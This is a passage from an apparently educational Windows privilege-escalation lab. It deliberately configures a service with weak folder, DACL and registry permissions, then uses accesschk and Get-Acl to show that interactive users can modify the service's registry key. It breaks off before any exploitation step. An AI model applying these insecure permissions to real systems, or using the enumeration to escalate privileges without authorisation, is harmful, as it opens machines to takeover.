<p>Make sure that the service DACL prevents other users from modifying the service configuration.</p>
<h1 id="privilege-escalation-via-registry-hives">Privilege Escalation via Registry Hives</h1>
<p>The Windows registry stores entries for each service. Each registry entry have an ACL attached to them. If the ACL is misconfigured we may be able to modify the service. According to the <a href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives" target="_blank" rel="noopener noreffer ">official</a> documentation](<a href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives" target="_blank" rel="noopener noreffer ">https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives</a>) a registry hive is the following:</p>
<blockquote>
<p>A <em>hive</em> is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.</p>
</blockquote>
<h2 id="configuration-2">Configuration</h2>
<p>Open an <strong>administrator</strong> command prompt or a PowerShell console as <strong>administrator</strong> and create the directory that we will use for the service path:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">md </span><span class="s2">&#34;C:\Program Files\Insecure Registry Service&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Copy the service executable file to the path of the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">copy </span><span class="s2">&#34;C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe&#34;</span> <span class="s2">&#34;C:\Program Files\Insecure Registry Service\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Grant full permissions to the executable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">icacls</span> <span class="s2">&#34;C:\Program Files\Insecure Registry Service&#34;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&#34;Authenticated Users:F&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">processed</span> <span class="n">file</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">Service</span>
</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create the <strong>insecure registry service</strong> with the SCM:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">create</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;\&#34;</span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">Service</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="n">exe</span><span class="s2">&#34;&#34;</span> <span class="n">type</span><span class="p">=</span> <span class="n">own</span> <span class="n">displayname</span><span class="p">=</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">CreateService</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">START_TYPE</span>         <span class="err">:</span> <span class="mf">3</span>   <span class="n">DEMAND_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERROR_CONTROL</span>      <span class="err">:</span> <span class="mf">1</span>   <span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">        <span class="n">BINARY_PATH_NAME</span>   <span class="err">:</span> <span class="s2">&#34;C:\Program Files\Insecure Registry Service\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">LOAD_ORDER_GROUP</span>   <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">TAG</span>                <span class="err">:</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">DISPLAY_NAME</span>       <span class="err">:</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">DEPENDENCIES</span>       <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START_NAME</span> <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: To create a quoted path we must add &ldquo;\ at the start of the binpath value. Example: &ldquo;&quot;C:\Path To\Executablee&rdquo;&rdquo; or &ldquo;&quot;C:\Path To\Executable&rdquo;&quot;.</p>
<p>If we just add a value like &ldquo;C:\Path To\Executable&rdquo; then the service will be unquoted.</p>
</blockquote>
<p>Set the service access rights:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">sdset</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span> <span class="s2">&#34;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSW;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">SetServiceObjectSecurity</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Add the service to the registry:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">echo </span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">services</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span> <span class="p">[</span><span class="mf">17</span> <span class="mf">1</span> <span class="mf">21</span> <span class="mf">8</span><span class="p">]</span> <span class="p">&gt;</span> <span class="n">svc</span><span class="p">.</span><span class="py">txt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="n">regini</span> <span class="n">svc</span><span class="p">.</span><span class="py">txt</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Start the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc start </span><span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">2</span>  <span class="n">START_PENDING</span>
</span></span><span class="line"><span class="cl">                                <span class="p">(</span><span class="n">NOT_STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">IGNORES_SHUTDOWN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x7d0</span>
</span></span><span class="line"><span class="cl">        <span class="n">PID</span>                <span class="err">:</span> <span class="mf">4584</span>
</span></span><span class="line"><span class="cl">        <span class="n">FLAGS</span>              <span class="err">:</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation-2">Privilege Escalation</h2>
<p>Query the Insecure Registry VulnService&quot; service and note that it runs with SYSTEM privileges (<code>SERVICE_START_NAME</code>).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">START_TYPE</span>         <span class="err">:</span> <span class="mf">3</span>   <span class="n">DEMAND_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERROR_CONTROL</span>      <span class="err">:</span> <span class="mf">1</span>   <span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">        <span class="n">BINARY_PATH_NAME</span>   <span class="err">:</span> <span class="s2">&#34;C:\Program Files\Insecure Registry Service\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">LOAD_ORDER_GROUP</span>   <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">TAG</span>                <span class="err">:</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">DISPLAY_NAME</span>       <span class="err">:</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">DEPENDENCIES</span>       <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START_NAME</span> <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using accesschk.exe we&rsquo;re gonna check which users or groups have access rights to modify the service registry hives:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Get-Acl</span> <span class="s2">&#34;HKLM:\System\CurrentControlSet\Services\Insecure Registry VulnService&#34;</span> <span class="p">|</span> <span class="nb">Format-List</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Path</span>   <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">Registry</span><span class="p">::</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">I</span>
</span></span><span class="line"><span class="cl">         <span class="n">nsecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="n">Owner</span>  <span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span><span class="line"><span class="cl"><span class="nb">Group </span> <span class="err">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl"><span class="n">Access</span> <span class="err">:</span> <span class="n">Everyone</span> <span class="n">Allow</span>  <span class="n">ReadKey</span>
</span></span><span class="line"><span class="cl">         <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">INTERACTIVE</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
</span></span><span class="line"><span class="cl">         <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
</span></span><span class="line"><span class="cl">         <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
</span></span><span class="line"><span class="cl"><span class="n">Audit</span>  <span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="n">Sddl</span>   <span class="err">:</span> <span class="n">O:BAG</span><span class="err">:</span><span class="n">SYD</span><span class="err">:</span><span class="n">P</span><span class="p">(</span><span class="n">A</span><span class="p">;</span><span class="n">CI</span><span class="p">;</span><span class="n">KR</span><span class="p">;;;</span><span class="n">WD</span><span class="p">)(</span><span class="n">A</span><span class="p">;</span><span class="n">CI</span><span class="p">;</span><span class="n">KA</span><span class="p">;;;</span><span class="n">IU</span><span class="p">)(</span><span class="n">A</span><span class="p">;</span><span class="n">CI</span><span class="p">;</span><span class="n">KA</span><span class="p">;;;</span><span class="n">SY</span><span class="p">)(</span><span class="n">A</span><span class="p">;</span><span class="n">CI</span><span class="p">;</span><span class="n">KA</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-vwqk</span> <span class="s2">&#34;HKLM\System\CurrentControlSet\Services\Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span><span class="p">\</span><span class="n">Security</span>
</span></span><span class="line"><span class="cl">  <span class="n">Medium</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="p">(</span><span class="k">Default</span><span class="p">)</span> <span class="p">[</span><span class="nb">No-Write</span><span class="n">-Up</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">        <span class="n">KEY_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span><span class="line"><span class="cl">        <span class="n">KEY_ALL_ACCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: The <code>NT AUTHORITY\INTERACTIVE</code> group have FullControl over the registry keys. This group has all the users that are logged on the system. Also the <code>BUILTIN\Administrators</code> have full access to this registry hives.</p>
</blockquote>
<p>Check if we can restart the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-cl</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">  <span class="n">DESCRIPTOR</span> <span class="n">FLAGS</span><span class="err">:</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="no">SE_DACL_PRESENT</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="no">SE_SACL_PRESENT</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="no">SE_SELF_RELATIVE</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="n">OWNER</span><span class="err">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mf">0</span><span class="p">]</span> <span class="n">ACCESS_ALLOWED_ACE_TYPE</span><span class="err">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_STATUS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_CONFIG</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_INTERROGATE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ENUMERATE_DEPENDENTS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_PAUSE_CONTINUE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_STOP</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_USER_DEFINED_CONTROL</span>
</span></span><span class="line"><span class="cl">        <span class="n">READ_CONTROL</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mf">1</span><span class="p">]</span> <span class="n">ACCESS_ALLOWED_ACE_TYPE</span><span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mf">2</span><span class="p">]</span> <span class="n">ACCESS_ALLOWED_ACE_TYPE</span><span class="err">:</span> <span class="n">Everyone</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_STATUS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_CONFIG</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_INTERROGATE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ENUMERATE_DEPENDENTS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_STOP</span>
</span></span><span class="line"><span class="cl">        <span class="n">READ_CONTROL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-ucqv</span> <span class="n">user</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RW</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">psservice</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">security</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PsService</span> <span class="n">v2</span><span class="p">.</span><span class="py">25</span> <span class="p">-</span> <span class="n">Service</span> <span class="n">information</span> <span class="n">and</span> <span class="kd">configuration</span><span class="w"> </span><span class="nb">utility
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mf">2001</span><span class="p">-</span><span class="mf">2010</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
